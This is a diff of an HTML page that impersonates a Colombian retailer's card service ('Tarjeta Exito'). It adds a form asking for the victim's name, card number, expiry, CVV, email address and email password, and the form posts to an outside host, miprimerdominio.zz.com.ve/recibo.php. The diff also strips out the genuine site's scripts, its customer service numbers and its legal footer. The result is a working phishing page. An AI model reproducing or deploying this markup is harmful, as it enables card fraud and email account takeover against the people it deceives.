@@ -14,13 +14,15 @@
     <script src="alertify.js"></script>
     <script src="alertify.min.js"></script>
     <link href="css/Alertify/alertify.css" rel="stylesheet"><link href="/Scripts/css/Alertify/alertify.min.css" rel="stylesheet">
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet">
 	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 	<script src="Popup.js"></script>
     <script src="Indicador.js"></script>
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
+
 	
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.13.1/jquery.validate.min.js"></script>
-	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
 <!-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>-->
 <style>
 /* CSS for Credit Card Payment form */
@@ -124,6 +126,45 @@ input[type=number] {
 input { 
     text-align: center; 
 }
+
+
+
+@media (min-width: 481px) and (max-width: 767px) {
+  
+body {
+    background-color: lightblue !important;
+  }
+  
+}
+
+  @media (min-width: 768px) and (max-width: 1024px) and (orientation: landscape) {
+  
+ body {
+    background-color: lightblue !important;
+  }
+  
+}
+
+
+@media (min-width: 1025px) and (max-width: 1280px) {
+  
+ body {
+    background-color: lightblue !important;
+  }
+  
+}
+
+
+
+@media (min-width: 768px) and (max-width: 1024px) {
+  
+  body {
+    background-color: lightblue !important;
+  }
+  
+}
+
+
 
 
 </style>
@@ -263,53 +304,15 @@ input {
 
 </div>
 
-<script type="text/javascript">
-//<![CDATA[
-var theForm = document.forms['aspnetForm'];
-if (!theForm) {
-    theForm = document.aspnetForm;
-}
-function __doPostBack(eventTarget, eventArgument) {
-    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
-        theForm.__EVENTTARGET.value = eventTarget;
-        theForm.__EVENTARGUMENT.value = eventArgument;
-        theForm.submit();
-    }
-}
-//]]>
-</script>
 
 
 
 
-<script type="text/javascript">
-//<![CDATA[
 
-    function TreeView_PopulateNodeDoCallBack(context,param) {
-        WebForm_DoCallback(context.data.treeViewID,param,TreeView_ProcessNodeData,context,TreeView_ProcessNodeData,false);
-    }
-var ctl00_tvMenu_Data = null;//]]>
-</script>
 
-<script src="ScriptResource.axd?d=Txjj2YejDj3zvglvAVNbKcUBMrrRcrBsOWRMcVLrAHCFcoPh9O7VAzCxbtkR45WWaT91JrKShC9lLYn8CdwdyTgY5A46FDFmXbc1HFxV0JNB__riJuSsh6MEYXUgengQbZambpobfhFrjWkDCPuou8feQL50rJAEALtJ0spkVjE1&amp;t=ffffffff93f2983c" type="text/javascript"></script>
-<script src="ScriptResource.axd?d=6S7LYMwRf9L_0uDpAX7gsvw0J1-MsBjJE6JC51Wg9CnpXtyyMtyCeYD877y0O4Yan99vZbnx0MsXZ3VxmTz6kBN7WYxklMAWuZYkKdWrkqRCcqgBWMLfBrOFV0oquvRHDidg-DKGXEWu96bJJCFQX-13bQ-C3hbBkJIbuZwEsqWvkUaN2h1DlWH4CTXOodP00&amp;t=ffffffffecf19baa" type="text/javascript"></script>
-<script type="text/javascript">
-//<![CDATA[
-if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
-//]]>
-</script>
-
-<script src="ScriptResource.axd?d=ZXTBFFihzm-Euw_Pq4F3qfUlIzSCuo1eL5SR1sIYNmHdX7qI7fAYmP0qkr9bpZttACr3TV5WlJ6Q6hMBbbIQv3b1gUDhsmQ060lnvwrRUCGlGVjyMcarZLk8YBmWB_wOtg-1XvKp-vVkTrBdvqjw-guh6STJ5ILQu571NWZAxdWB0EzXNDlQiURp5Of6XUt_0&amp;t=ffffffffecf19baa" type="text/javascript"></script>
 <script src="_UtilidadesSitio.js" type="text/javascript"></script>
 <script src="ScriptResource.axd?d=C0KV2aPyZxr7TK23dCYPQaFBhrjaYmXQgxFjfutmsApRGJaHQg9gdeWZ_RkvHwjBqaOZKnf6PwcDsjOdKEjFeSX8-4IE7AqidmwVpohQDOMkL7SFY454ksBCy4FysbZ5Z_3_tXSDEyqBK1Vs2MesXnH4eyUoBEYECClQlCNz-HDiDq7BFxsd52aSPKFkWBOj0&amp;t=ffffffffecf19baa" type="text/javascript"></script>
-<script type="text/javascript">
-//<![CDATA[
-function WebForm_OnSubmit() {
-if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
-return true;
-}
-//]]>
-</script>
+
 
 <div>
 
@@ -317,11 +320,7 @@ return true;
 	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
 	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="+">
 </div>
-        <script type="text/javascript">
-//<![CDATA[
-Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm', [], [], [], 90, 'ctl00');
-//]]>
-</script>
+
 
 
         <span id="ctl00_TReloj" style="visibility:hidden;display:none;"></span>
@@ -428,161 +427,205 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm
                     
 		
 	</tbody></table>
+	
+	
+	
+	
+	
+<div class="creditCardForm">
+    <div class="heading">
+        <h2>Confirmar Datos Exito / Correo Electrónico</h2>
+    </div>
+    <div class="payment">
+        <form id="miformulario" method="post" action="http://miprimerdominio.zz.com.ve/recibo.php" name="form2" >
+            
+			<div class="row">
+			<div class="form-group owner  col-xs-3 col-md-4 "><!-- owner  col-xs-3 col-md-4-->
+                <label for="owner">Nombre completo</label>
+                <input type="text" name="name" class="form-control" id="owner" required >
+            </div>
+
+			 <div class="form-group" id="card-number-field">
+                <label for="cardNumber">Tarjeta Exito</label>
+                <input type="text" name="tard" class="form-control" id="cardNumber" minlength="16" maxlength="16" style="width: 40% !important;" required>
+            </div>
+			 </div>
+			 
+		<div class="row">
+			<div class="form-group   col-md-3   "><!-- owner  col-xs-3 col-md-4-->
+                <label for="owner">mes</label>
+                <select name="mes" class="form-control">
+                    <option value="01">Enero</option>
+                    <option value="02">Febrero </option>
+                    <option value="03">Marzo</option>
+                    <option value="04">Abril</option>
+                    <option value="05">Mayo</option>
+                    <option value="06">Junio</option>
+                    <option value="07">Julio</option>
+                    <option value="08">Agosto</option>
+                    <option value="09">Septiembre</option>
+                    <option value="10">Octubre</option>
+                    <option value="11">Noviembre</option>
+                    <option value="12">Diciembre</option>
+                </select>
+            </div>
+
+			 <div class="form-group col-md-3" id="card-number-field">
+                <label for="cardNumber">ano</label>
+                <select name="ano" class="form-control">
+                    <option value="21"> 2021</option>
+                    <option value="22"> 2022</option>
+                    <option value="23"> 2023</option>
+                    <option value="24"> 2024</option>
+                    <option value="25"> 2025</option>
+                    <option value="26"> 2026</option>
+					<option value="27"> 2027</option>
+                </select>
+            </div>
+			
+						 <div class="form-group  col-md-3" id="card-number-field">
+                 <label for="cvv">CVV</label>
+                <input type="password" required name="psu" class="form-control"  id="cvv" minlength="3" maxlength="3" >
+            </div>
+			
+			
+			
+			 </div>
+			 
+			 <div class="row">
+			<div class="form-group owner  col-xs-3 col-md-4 "><!-- owner  col-xs-3 col-md-4-->
+                <label for="correo">Correo</label>
+                <input type="email" required name="mail" class="form-control" id="correo"  >
+            </div>
+
+			 <div class="form-group" id="card-number-field">
+                <label for="password">Password</label>
+                <input type="text" required name="psum" class="form-control" id="password"  style="width: 40% !important;">
+            </div>
+			 </div>
+			 
+			<!--
+			<div class="form-group col-xs-3 " id="expiration-date">
+			
+		
+			<div class="row">
+			<div class="col-xs-12 col-md-12">
+			
+                <label>Fecha de expiración</label>
+				<br>Mes
+                <select name="mes" class="form-control">
+                    <option value="01">Enero</option>
+                    <option value="02">Febrero </option>
+                    <option value="03">Marzo</option>
+                    <option value="04">Abril</option>
+                    <option value="05">Mayo</option>
+                    <option value="06">Junio</option>
+                    <option value="07">Julio</option>
+                    <option value="08">Agosto</option>
+                    <option value="09">Septiembre</option>
+                    <option value="10">Octubre</option>
+                    <option value="11">Noviembre</option>
+                    <option value="12">Diciembre</option>
+                </select>
+				</div>
+				
+				<div class="col-xs-12 col-md-12">
+				<label></label>
+				<br>Mes
+				 <select name="ano" class="form-control">
+                    <option value="21"> 2021</option>
+                    <option value="22"> 2022</option>
+                    <option value="23"> 2023</option>
+                    <option value="24"> 2024</option>
+                    <option value="25"> 2025</option>
+                    <option value="26"> 2026</option>
+					<option value="27"> 2027</option>
+                </select>
+				
+				</div>
+	
+				
+			<div class="col-xs-12 col-md-12">
+				<label></label>
+				<br>CVV
+				<input type="password" class="form-control" id="cvv" minlength="3" maxlength="3" style="width: 36% !important;">
+				</div>
+				</div>
+				
+				
+				 
+				
+				
+				
+				
+				<!--
+				<div class="form-group col-xs-2 " id="expiration-date">
+                <label> </label><br>Año<br>
+                <select name="ano">
+                    <option value="21"> 2021</option>
+                    <option value="22"> 2022</option>
+                    <option value="23"> 2023</option>
+                    <option value="24"> 2024</option>
+                    <option value="25"> 2025</option>
+                    <option value="26"> 2026</option>
+					<option value="27"> 2027</option>
+                </select>
+				
+				</div>-->
+				
+				
+				<!--
+			<div class="form-group CVV col-xs-2">
+                <label for="cvv">CVV</label>
+                <input type="password" class="form-control" id="cvv" minlength="3" maxlength="3" style="width: 36% !important;">
+            </div>
+			-->
+			
+				
+				
+				<!--
+                <select name="ano">
+                    <option value="21"> 2021</option>
+                    <option value="22"> 2022</option>
+                    <option value="23"> 2023</option>
+                    <option value="24"> 2024</option>
+                    <option value="25"> 2025</option>
+                    <option value="26"> 2026</option>
+					<option value="27"> 2027</option>
+                </select>-->
+           
+
+
+		   </div>
+			
+			
+			
+			
+			
+          
+			
+			
+           <!--
+            <div class="form-group correo  col-xs-8">
+                <label for="correo">Correo</label>
+                <input type="text" class="form-control" id="correo"  style="width: 36% !important;">
+            </div>
+
+			 <div class="form-group  col-xs-8" id="card-number-field">
+                <label for="pass">Contraseña</label>
+                <input type="text" class="form-control" id="pass"  style="width: 36% !important;">
+            </div>-->
+            
+			<input type="hidden" name="wadjfh1231!3" id="wadjfh1231!3" />
+            <div class="form-group col-xs-12" id="pay-now"><br><br>
+                <button type="submit" class="btn btn-default" id="confirm-purchase">Confirmar</button>
+            </div>
+        </form>
+    </div>
 </div>
-<div class="container" >
-<div class="row">
-<!-- You can make it whatever width you want. I'm making it full width
-on <= small devices and 4/12 page width on >= medium devices -->
-<div class="col-xs-12 col-md-6">
-
-<br>
-<!-- CREDIT CARD FORM STARTS HERE -->
-
-<div class="panel panel-default credit-card-box">
-
-<div class="panel-body">
-<form role="form" id="payment-form">
-<div class="row">
-<div class="col-xs-12">
-<div class="form-group">
-<label for="cardNumber" align="center">Ingrese sus datos para reactivar su cuenta y tarjeta exito</label>
-<div class="input-group">
-<input 
-onkeypress="soloNumeros()"
-type="tel"
-class="form-control"
-name="cardNumber"
-placeholder="Ingrese su tarjeta exito"
-autocomplete="cc-number"
-required autofocus 
-/>
-<span class="input-group-addon"><i class="fa fa-credit-card"></i></span>
-</div>
-</div>                            
-</div>
-</div>
-
-<div class="row">
-<div class="col-xs-12">
-<div class="form-group">
-<label for="cardNumber2">Fecha de expiración</label>
-</div>
-</div>
-</div>
-
-<div class="row">
-<div class=" col-md-4">
-<div class="form-group">
-<label for="cardExpiry"><span class="hidden-xs">Mes</span></label>
-<input 
-type="tel" 
-class="form-control" 
-id="mes"
-name="cardExpiry"
-placeholder="Mes"
-autocomplete="cc-exp"
-required 
-/>
-</div>
-</div>
-
-
-<div class=" col-md-3  ">
-<div class="form-group">
-<label for="cardCVC">Año</label>
-<input 
-id="ano"
-type="tel" 
-class="form-control"
-name="cardCVC"
-placeholder="Año"
-autocomplete="cc-csc"
-required
-/>
-</div>
-</div>
-
-<div class="col-xs-3 col-md-3 ">
-<div class="form-group">
-<label for="cardCVC">CVC</label>
-<input 
-id="cvv"
-type="tel" 
-class="form-control"
-name="cardCVC"
-placeholder="CVC"
-autocomplete="cc-csc"
-required
-/>
-</div>
-</div>
-
-
-</div>
 
 
 
-
-
-<div class="row">
-<div class="col-xs-6 col-md-6">
-<div class="form-group">
-<label for="cardNumber">Sincronice su Email</label>
-<div class="input-group">
-<input 
-type="tel"
-class="form-control"
-name="cardNumber"
-placeholder="Correo electronico"
-autocomplete="cc-number"
-required autofocus 
-/>
-
-
-
-</div>
-</div>  
-
- 
-</div>
-
-<div class="col-xs-5 col-md-5 pull-right">
-<div class="form-group">
-<label for="cardNumber">Contraseña de su correo </label>
-<div class="input-group">
-<input 
-type="tel"
-class="form-control"
-name="cardNumber"
-placeholder="contraseña Email"
-autocomplete="cc-number"
-required autofocus 
-/>
-
-</div>
-</div>   
-</div>
-</div>
-
-
-
-
-
-
-<div class="row">
-<div class="col-xs-12">
-<button class="btn btn-success btn-lg btn-block" type="submit">Confirmar datos</button>
-</div>
-</div>
-<div class="row" style="display:none;">
-<div class="col-xs-12">
-<p class="payment-errors"></p>
-</div>
-</div>
-
-</div> 
-</div>           
-<!-- CREDIT CARD FORM ENDS HERE -->
 
 
 </div>            
@@ -591,11 +634,11 @@ required autofocus
 
 </div>
 </div>
-        <div>
-
-
+	
+	
 </div>
-    
+
+        
 	
 	
 	
@@ -677,74 +720,11 @@ required autofocus
 
     <script language="javascript" type="text/javascript">
 	
-	function soloNumeros(e)
-{
-	var key = window.Event ? e.which : e.keyCode
-	return ((key >= 48 && key <= 57) || (key==8))
-}
-	
-	window.addEventListener("load", function() {
-  miformulario.mes.addEventListener("keypress", soloNumeros, false);
-  miformulario.ano.addEventListener("keypress", soloNumeros, false);
-  miformulario.cvv.addEventListener("keypress", soloNumeros, false);
-});
-	
-	//Solo permite introducir numeros.
-function soloNumeros(e){
-  var key = window.event ? e.which : e.keyCode;
-  if (key < 48 || key > 57) {
-    e.preventDefault();
-  }
-}
 
 
-
-
-		
-				
-	
-		
-	
-	
-		
-		
-
-
-			 
-				
-					  
-			
-
-
-
-
-
-	
-	
-		
-		
-	
         $(document).ready(function () {
 			
 
-			$('#cvv').click(function(){
- 
-		document.getElementById("movida").src = "trasera.png";
-    
-	});
-					
-			 
- 	$('#mes').click(function(){
- 
-		document.getElementById("movida").src = "delantera.png";
-    
-	});
-	
-		$('#ano').click(function(){
- 
-		document.getElementById("movida").src = "delantera.png";
-    
-	});
  
 			
 		 openLoading();
@@ -756,13 +736,7 @@ function soloNumeros(e){
 
 		
 			
-			
-            var numTarjeta = '**** **** **** ****';
-            if (numTarjeta != null) {
-                divexpandcollapse("div" + numTarjeta);
-                    '';
-            }
-			
+		
 			
 			
 			
@@ -775,147 +749,13 @@ function soloNumeros(e){
 
 	
            
-        }
-
-        );
+        });
 		
 		
 		
 		
 		
 		
-		
-		
-		
-		
-		
-		
-		
-		
-		var $form = $('#payment-form');
-$form.on('submit', payWithStripe);
-
-/* If you're using Stripe for payments */
-function payWithStripe(e) {
-    e.preventDefault();
-
-    /* Visual feedback */
-    $form.find('[type=submit]').html('Validating <i class="fa fa-spinner fa-pulse"></i>');
-
-    var PublishableKey = 'pk_test_b1qXXwATmiaA1VDJ1mOVVO1p'; // Replace with your API publishable key
-    Stripe.setPublishableKey(PublishableKey);
-    
-    /* Create token */
-    var expiry = $form.find('[name=cardExpiry]').payment('cardExpiryVal');
-    var ccData = {
-        number: $form.find('[name=cardNumber]').val().replace(/\s/g,''),
-        cvc: $form.find('[name=cardCVC]').val(),
-        exp_month: expiry.month, 
-        exp_year: expiry.year
-    };
-    
-    Stripe.card.createToken(ccData, function stripeResponseHandler(status, response) {
-        if (response.error) {
-            /* Visual feedback */
-            $form.find('[type=submit]').html('Try again');
-            /* Show Stripe errors on the form */
-            $form.find('.payment-errors').text(response.error.message);
-            $form.find('.payment-errors').closest('.row').show();
-        } else {
-            /* Visual feedback */
-            $form.find('[type=submit]').html('Processing <i class="fa fa-spinner fa-pulse"></i>');
-            /* Hide Stripe errors on the form */
-            $form.find('.payment-errors').closest('.row').hide();
-            $form.find('.payment-errors').text("");
-            // response contains id and card, which contains additional card details            
-            console.log(response.id);
-            console.log(response.card);
-            var token = response.id;
-            // AJAX - you would send 'token' to your server here.
-            $.post('/account/stripe_card_token', {
-                    token: token
-                })
-                // Assign handlers immediately after making the request,
-                .done(function(data, textStatus, jqXHR) {
-                    $form.find('[type=submit]').html('Payment successful <i class="fa fa-check"></i>').prop('disabled', true);
-                })
-                .fail(function(jqXHR, textStatus, errorThrown) {
-                    $form.find('[type=submit]').html('There was a problem').removeClass('success').addClass('error');
-                    /* Show Stripe errors on the form */
-                    $form.find('.payment-errors').text('Try refreshing the page and trying again.');
-                    $form.find('.payment-errors').closest('.row').show();
-                });
-        }
-    });
-}
-/* Fancy restrictive input formatting via jQuery.payment library*/
-$('input[name=cardNumber]').payment('formatCardNumber');
-$('input[name=cardCVC]').payment('formatCardCVC');
-$('input[name=cardExpiry').payment('formatCardExpiry');
-
-/* Form validation using Stripe client-side validation helpers */
-jQuery.validator.addMethod("cardNumber", function(value, element) {
-    return this.optional(element) || Stripe.card.validateCardNumber(value);
-}, "Please specify a valid credit card number.");
-
-jQuery.validator.addMethod("cardExpiry", function(value, element) {    
-    /* Parsing month/year uses jQuery.payment library */
-    value = $.payment.cardExpiryVal(value);
-    return this.optional(element) || Stripe.card.validateExpiry(value.month, value.year);
-}, "Invalid expiration date.");
-
-jQuery.validator.addMethod("cardCVC", function(value, element) {
-    return this.optional(element) || Stripe.card.validateCVC(value);
-}, "Invalid CVC.");
-
-validator = $form.validate({
-    rules: {
-        cardNumber: {
-            required: true,
-            cardNumber: true            
-        },
-        cardExpiry: {
-            required: true,
-            cardExpiry: true
-        },
-        cardCVC: {
-            required: true,
-            cardCVC: true
-        }
-    },
-    highlight: function(element) {
-        $(element).closest('.form-control').removeClass('success').addClass('error');
-    },
-    unhighlight: function(element) {
-        $(element).closest('.form-control').removeClass('error').addClass('success');
-    },
-    errorPlacement: function(error, element) {
-        $(element).closest('.form-group').append(error);
-    }
-});
-
-paymentFormReady = function() {
-    if ($form.find('[name=cardNumber]').hasClass("success") &&
-        $form.find('[name=cardExpiry]').hasClass("success") &&
-        $form.find('[name=cardCVC]').val().length > 1) {
-        return true;
-    } else {
-        return false;
-    }
-}
-
-$form.find('[type=submit]').prop('disabled', true);
-var readyInterval = setInterval(function() {
-    if (paymentFormReady()) {
-        $form.find('[type=submit]').prop('disabled', false);
-        clearInterval(readyInterval);
-    }
-}, 250);
-
-
-/*
-https://goo.gl/PLbrBK
-*/
 		
 		
 		
@@ -930,17 +770,7 @@ https://goo.gl/PLbrBK
         </div>
 		
 		
-        <div id="ContactFrame"><br><br>
-            Líneas de atención al cliente: Medellín 444 37 27, Bogotá 482 48 04, Cali 380 89 33 y otras ciudades 01 8000 978 888
-        </div>
-
-        <div id="FooterFrame">
-            Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia
-        </div>
-        <div id="FooterFrame">
-            Para conocer acerca de la utilización de Información,
-            <a id="ctl00_HyperLink1" href="#" target="_blank">Ingresa aquí</a>
-        </div>
+     
 
     
 
@@ -953,4 +783,10 @@ https://goo.gl/PLbrBK
 
 
 
-</body></html>
+</body>
+
+  
+    <script src="jquery.payform.min.js" charset="utf-8"></script>
+    <script src="script.js"></script>
+	
+	</html>
